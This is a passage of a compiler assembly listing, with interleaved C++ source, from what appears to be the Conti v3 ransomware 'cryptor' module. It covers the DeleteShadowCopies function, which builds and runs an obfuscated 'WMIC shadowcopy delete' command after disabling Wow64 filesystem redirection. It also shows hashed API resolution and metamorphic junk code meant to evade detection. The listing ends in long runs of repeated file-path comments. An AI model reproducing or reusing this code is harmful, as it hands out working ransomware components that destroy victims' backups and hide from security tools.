	00 12		 mov	 BYTE PTR $T6[rbp-100], 18
  0148c	c6 85 9d 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-99], 18
  01493	c6 85 9e 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-98], 18
  0149a	0f b6 45 01	 movzx	 eax, BYTE PTR $T6[rbp-255]

; 58   :         return m_isDecrypted;

  0149e	0f b6 45 00	 movzx	 eax, BYTE PTR $T6[rbp-256]

; 63   :         if (!isDecrypted())

  014a2	84 c0		 test	 al, al
  014a4	75 5c		 jne	 SHORT $LN704@DeleteShad

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  014a6	48 8b fe	 mov	 rdi, rsi
  014a9	0f 1f 80 00 00
	00 00		 npad	 7
$LL705@DeleteShad:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  014b0	0f b6 4c 3d 01	 movzx	 ecx, BYTE PTR $T6[rbp+rdi-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  014b5	b8 12 00 00 00	 mov	 eax, 18
  014ba	2b c1		 sub	 eax, ecx
  014bc	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  014bf	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  014c4	f7 e9		 imul	 ecx
  014c6	03 d1		 add	 edx, ecx
  014c8	c1 fa 06	 sar	 edx, 6
  014cb	8b c2		 mov	 eax, edx
  014cd	c1 e8 1f	 shr	 eax, 31
  014d0	03 d0		 add	 edx, eax
  014d2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  014d5	2b c8		 sub	 ecx, eax
  014d7	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  014dc	83 c1 7f	 add	 ecx, 127		; 0000007fH
  014df	f7 e9		 imul	 ecx
  014e1	03 d1		 add	 edx, ecx
  014e3	c1 fa 06	 sar	 edx, 6
  014e6	8b c2		 mov	 eax, edx
  014e8	c1 e8 1f	 shr	 eax, 31
  014eb	03 d0		 add	 edx, eax
  014ed	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  014f0	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  014f2	88 4c 3d 01	 mov	 BYTE PTR $T6[rbp+rdi-255], cl
  014f6	48 ff c7	 inc	 rdi
  014f9	48 81 ff 9e 00
	00 00		 cmp	 rdi, 158		; 0000009eH
  01500	72 ae		 jb	 SHORT $LL705@DeleteShad
$LN704@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 256  : 		wsprintfW(CmdLine, OBFW(L"cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \"ID='%s'\" delete"), vtProp.bstrVal);

  01502	4c 8b 85 d8 00
	00 00		 mov	 r8, QWORD PTR vtProp$23[rbp-248]
  01509	48 8d 55 01	 lea	 rdx, QWORD PTR $T6[rbp-255]
  0150d	48 8d 8d 40 01
	00 00		 lea	 rcx, QWORD PTR CmdLine$25[rbp-256]
  01514	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_wsprintfW
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 131  : 	pFunction = (BOOL(WINAPI*)(PVOID*))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5126a209, 101);//GetProcAddress(hKernel32, OBFA("Wow64DisableWow64FsRedirection"));

  0151a	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 84   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0151f	c7 44 24 50 0f
	1f 18 00	 mov	 DWORD PTR _morph_var$11[rsp], 1580815 ; 00181f0fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 131  : 	pFunction = (BOOL(WINAPI*)(PVOID*))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5126a209, 101);//GetProcAddress(hKernel32, OBFA("Wow64DisableWow64FsRedirection"));

  01527	41 b8 09 a2 26
	51		 mov	 r8d, 1361486345		; 5126a209H
  0152d	44 8d 4a 56	 lea	 r9d, QWORD PTR [rdx+86]
  01531	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 132  : 	return pFunction(OldValue);

  01536	48 8d 8d b0 00
	00 00		 lea	 rcx, QWORD PTR Old$22[rbp-256]
  0153d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0153f	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$16[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01547	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0154c	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$16[rsp]
  01550	f7 e9		 imul	 ecx
  01552	8b c2		 mov	 eax, edx
  01554	c1 e8 1f	 shr	 eax, 31
  01557	03 d0		 add	 edx, eax
  01559	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0155c	3b c8		 cmp	 ecx, eax
  0155e	74 52		 je	 SHORT $LN145@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  01560	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$16[rsp]
  01564	8b 85 b0 00 00
	00		 mov	 eax, DWORD PTR Old$22[rbp-256]
  0156a	83 c0 02	 add	 eax, 2
  0156d	03 c8		 add	 ecx, eax
  0156f	89 4c 24 50	 mov	 DWORD PTR _morph_var$16[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01573	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$16[rsp]
  01577	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0157c	7d 07		 jge	 SHORT $LN1436@DeleteShad
  0157e	ff c8		 dec	 eax
  01580	83 c8 fc	 or	 eax, -4
  01583	ff c0		 inc	 eax
$LN1436@DeleteShad:
  01585	85 c0		 test	 eax, eax
  01587	0f 85 86 00 00
	00		 jne	 $LN144@DeleteShad
  0158d	0f 1f 00	 npad	 3
$LL137@DeleteShad:
  01590	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$16[rsp]
  01594	ff c0		 inc	 eax
  01596	89 44 24 50	 mov	 DWORD PTR _morph_var$16[rsp], eax
  0159a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$16[rsp]
  0159e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  015a3	7d 07		 jge	 SHORT $LN1435@DeleteShad
  015a5	ff c8		 dec	 eax
  015a7	83 c8 fc	 or	 eax, -4
  015aa	ff c0		 inc	 eax
$LN1435@DeleteShad:
  015ac	85 c0		 test	 eax, eax
  015ae	74 e0		 je	 SHORT $LL137@DeleteShad

; 51   : 	}

  015b0	eb 61		 jmp	 SHORT $LN144@DeleteShad
$LN145@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  015b2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$16[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  015b6	b9 02 00 00 00	 mov	 ecx, 2
  015bb	2b 8d b0 00 00
	00		 sub	 ecx, DWORD PTR Old$22[rbp-256]
  015c1	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$16[rsp]
  015c5	03 c1		 add	 eax, ecx
  015c7	89 44 24 50	 mov	 DWORD PTR _morph_var$16[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  015cb	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  015d0	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$16[rsp]
  015d4	f7 e9		 imul	 ecx
  015d6	8b c2		 mov	 eax, edx
  015d8	c1 e8 1f	 shr	 eax, 31
  015db	03 d0		 add	 edx, eax
  015dd	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  015e0	3b c8		 cmp	 ecx, eax
  015e2	75 2f		 jne	 SHORT $LN144@DeleteShad
  015e4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL139@DeleteShad:
  015f0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$16[rsp]
  015f4	ff c0		 inc	 eax
  015f6	89 44 24 50	 mov	 DWORD PTR _morph_var$16[rsp], eax
  015fa	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  015ff	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$16[rsp]
  01603	f7 e9		 imul	 ecx
  01605	8b c2		 mov	 eax, edx
  01607	c1 e8 1f	 shr	 eax, 31
  0160a	03 d0		 add	 edx, eax
  0160c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0160f	3b c8		 cmp	 ecx, eax
  01611	74 dd		 je	 SHORT $LL139@DeleteShad
$LN144@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 265  : 		CmdExecW(CmdLine);

  01613	48 8d 8d 40 01
	00 00		 lea	 rcx, QWORD PTR CmdLine$25[rbp-256]
  0161a	e8 00 00 00 00	 call	 ?CmdExecW@@YAXPEB_W@Z	; CmdExecW

; 266  : 		pWow64RevertWow64FsRedirection(Old);

  0161f	48 8b bd b0 00
	00 00		 mov	 rdi, QWORD PTR Old$22[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 202  : 	pFunction = (BOOL(WINAPI*)(PVOID))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x58cb0595, 94);//GetProcAddress(hKernel32, OBFA("Wow64RevertWow64FsRedirection"));

  01626	ba 0f 00 00 00	 mov	 edx, 15
  0162b	41 b8 95 05 cb
	58		 mov	 r8d, 1489700245		; 58cb0595H
  01631	44 8d 4a 4f	 lea	 r9d, QWORD PTR [rdx+79]
  01635	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 203  : 	return pFunction(OlValue);

  0163a	48 8b cf	 mov	 rcx, rdi
  0163d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0163f	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$9[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01647	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0164c	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$9[rsp]
  01650	f7 e9		 imul	 ecx
  01652	8b c2		 mov	 eax, edx
  01654	c1 e8 1f	 shr	 eax, 31
  01657	03 d0		 add	 edx, eax
  01659	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0165c	3b c8		 cmp	 ecx, eax
  0165e	74 52		 je	 SHORT $LN319@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  01660	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$9[rsp]
  01664	8b 85 b0 00 00
	00		 mov	 eax, DWORD PTR Old$22[rbp-256]
  0166a	83 c0 02	 add	 eax, 2
  0166d	03 c8		 add	 ecx, eax
  0166f	89 4c 24 50	 mov	 DWORD PTR _morph_var$9[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01673	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$9[rsp]
  01677	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0167c	7d 07		 jge	 SHORT $LN1433@DeleteShad
  0167e	ff c8		 dec	 eax
  01680	83 c8 fc	 or	 eax, -4
  01683	ff c0		 inc	 eax
$LN1433@DeleteShad:
  01685	85 c0		 test	 eax, eax
  01687	0f 85 86 00 00
	00		 jne	 $LN318@DeleteShad
  0168d	0f 1f 00	 npad	 3
$LL311@DeleteShad:
  01690	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$9[rsp]
  01694	ff c0		 inc	 eax
  01696	89 44 24 50	 mov	 DWORD PTR _morph_var$9[rsp], eax
  0169a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$9[rsp]
  0169e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  016a3	7d 07		 jge	 SHORT $LN1432@DeleteShad
  016a5	ff c8		 dec	 eax
  016a7	83 c8 fc	 or	 eax, -4
  016aa	ff c0		 inc	 eax
$LN1432@DeleteShad:
  016ac	85 c0		 test	 eax, eax
  016ae	74 e0		 je	 SHORT $LL311@DeleteShad

; 51   : 	}

  016b0	eb 61		 jmp	 SHORT $LN318@DeleteShad
$LN319@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  016b2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$9[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  016b6	b9 02 00 00 00	 mov	 ecx, 2
  016bb	2b 8d b0 00 00
	00		 sub	 ecx, DWORD PTR Old$22[rbp-256]
  016c1	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$9[rsp]
  016c5	03 c1		 add	 eax, ecx
  016c7	89 44 24 50	 mov	 DWORD PTR _morph_var$9[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  016cb	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  016d0	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$9[rsp]
  016d4	f7 e9		 imul	 ecx
  016d6	8b c2		 mov	 eax, edx
  016d8	c1 e8 1f	 shr	 eax, 31
  016db	03 d0		 add	 edx, eax
  016dd	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  016e0	3b c8		 cmp	 ecx, eax
  016e2	75 2f		 jne	 SHORT $LN318@DeleteShad
  016e4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL313@DeleteShad:
  016f0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$9[rsp]
  016f4	ff c0		 inc	 eax
  016f6	89 44 24 50	 mov	 DWORD PTR _morph_var$9[rsp], eax
  016fa	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  016ff	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$9[rsp]
  01703	f7 e9		 imul	 ecx
  01705	8b c2		 mov	 eax, edx
  01707	c1 e8 1f	 shr	 eax, 31
  0170a	03 d0		 add	 edx, eax
  0170c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0170f	3b c8		 cmp	 ecx, eax
  01711	74 dd		 je	 SHORT $LL313@DeleteShad
$LN318@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1062 : 	pFunction = (HRESULT(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xbc7bf3e8, 18);

  01713	ba 19 00 00 00	 mov	 edx, 25
  01718	41 b8 e8 f3 7b
	bc		 mov	 r8d, -1132727320	; bc7bf3e8H
  0171e	44 8d 4a f9	 lea	 r9d, QWORD PTR [rdx-7]
  01722	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1063 : 	return pFunction(pvarg);

  01727	48 8d 8d d0 00
	00 00		 lea	 rcx, QWORD PTR vtProp$23[rbp-256]
  0172e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 271  : 		pclsObj->Release();

  01730	48 8b 8d c8 00
	00 00		 mov	 rcx, QWORD PTR pclsObj$[rbp-256]
  01737	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  0173a	ff 50 10	 call	 QWORD PTR [rax+16]
  0173d	48 8b 8d b8 00
	00 00		 mov	 rcx, QWORD PTR pEnumerator$[rbp-256]
  01744	48 85 c9	 test	 rcx, rcx
  01747	0f 85 03 f8 ff
	ff		 jne	 $LL2@DeleteShad
$LN1473@DeleteShad:

; 272  : 	}
; 273  : 
; 274  : 	// Cleanup
; 275  : 	// ========
; 276  : 	if (pContext) {

  0174d	48 8b 8d c0 00
	00 00		 mov	 rcx, QWORD PTR pContext$[rbp-256]
  01754	48 85 c9	 test	 rcx, rcx
  01757	74 06		 je	 SHORT $LN13@DeleteShad

; 277  : 		pContext->Release();

  01759	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  0175c	ff 50 10	 call	 QWORD PTR [rax+16]
$LN13@DeleteShad:

; 278  : 	}
; 279  : 	pSvc->Release();

  0175f	48 8b 8d a0 00
	00 00		 mov	 rcx, QWORD PTR pSvc$[rbp-256]
  01766	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  01769	ff 50 10	 call	 QWORD PTR [rax+16]

; 280  : 	pLoc->Release();

  0176c	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR pLoc$[rbp-256]
  01773	48 8b 11	 mov	 rdx, QWORD PTR [rcx]
  01776	ff 52 10	 call	 QWORD PTR [rdx+16]

; 281  : 	pEnumerator->Release();

  01779	48 8b 8d b8 00
	00 00		 mov	 rcx, QWORD PTR pEnumerator$[rbp-256]
  01780	48 8b 11	 mov	 rdx, QWORD PTR [rcx]
  01783	ff 52 10	 call	 QWORD PTR [rdx+16]
$LN1682@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 770  : 	pFunction = (VOID(WINAPI*)())getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x68cc2bb5, 1);//GetProcAddress(hOle32, OBFA("CoUninitialize"));

  01786	45 8b ce	 mov	 r9d, r14d
  01789	41 b8 b5 2b cc
	68		 mov	 r8d, 1758210997		; 68cc2bb5H
  0178f	ba 18 00 00 00	 mov	 edx, 24
  01794	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 771  : 	return pFunction();

  01799	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 283  : 	return TRUE;

  0179b	41 0f b7 c6	 movzx	 eax, r14w
$LN1681@DeleteShad:
  0179f	48 8b 9c 24 70
	0a 00 00	 mov	 rbx, QWORD PTR [rsp+2672]
$LN1680@DeleteShad:
  017a7	4c 8b b4 24 78
	0a 00 00	 mov	 r14, QWORD PTR [rsp+2680]
  017af	4c 8b bc 24 80
	0a 00 00	 mov	 r15, QWORD PTR [rsp+2688]
$LN1@DeleteShad:

; 284  : }

  017b7	48 8b 8d 40 09
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  017be	48 33 cc	 xor	 rcx, rsp
  017c1	e8 00 00 00 00	 call	 __security_check_cookie
  017c6	48 81 c4 50 0a
	00 00		 add	 rsp, 2640		; 00000a50H
  017cd	5f		 pop	 rdi
  017ce	5e		 pop	 rsi
  017cf	5d		 pop	 rbp
  017d0	c3		 ret	 0
?DeleteShadowCopies@cryptor@@YAFPEAX@Z ENDP		; cryptor::DeleteShadowCopies
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
